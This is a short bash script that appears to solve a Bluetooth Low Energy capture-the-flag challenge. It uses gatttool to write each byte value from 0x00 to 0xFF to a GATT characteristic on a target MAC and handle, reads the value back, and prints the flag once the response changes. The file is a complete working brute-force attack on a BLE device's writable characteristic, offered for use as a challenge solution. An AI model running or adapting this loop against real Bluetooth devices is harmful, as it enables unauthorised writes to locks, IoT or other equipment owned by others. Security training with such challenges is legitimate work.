#! /usr/bin/bash

if [ "$#" -ne 2 ];
then
    echo "Usage: ./brute_force.sh <mac> <handle>"
    exit
fi

start_time=$(date -u +%s)

for i in {0..255}
do
    x=$(printf "%X" $i)
    echo -n "Trying 0x$x: "
    gatttool -b $1 --char-write-req -a $2 -n $(echo -ne "\x$x" | xxd -ps)
    resp=$(gatttool -b $1 --char-read -a $2|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p)

    if [ "$resp" != "Brute force my value 00 to ff" ];
    then
       end_time=$(date -u +%s)
       total_time="$(($end_time-$start_time))"
       echo -n "Took $total_time seconds to find 0x$x. here is your flag: "
       echo $resp
       exit
    fi   
done
